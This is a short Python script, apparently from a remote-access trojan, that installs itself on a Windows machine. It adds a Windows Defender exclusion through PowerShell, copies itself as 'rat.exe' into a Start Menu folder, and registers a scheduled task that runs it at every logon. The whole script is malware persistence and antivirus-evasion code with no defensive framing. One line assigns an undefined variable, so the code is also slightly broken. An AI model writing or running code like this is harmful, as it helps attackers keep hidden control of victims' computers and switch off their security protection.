import os
import shutil
import sys

source = sys.executable
source = pathfile
destination = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\rat.exe"

exclusion = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath \'{destination}\'"'
os.system(exclusion)

shutil.copy2(source, destination)

command = f'SchTasks /create /f /sc Onlogon /tn "mainv5" /tr "{destination} -"'
os.system(command)

if source != destination:
    os.system("echo melt")
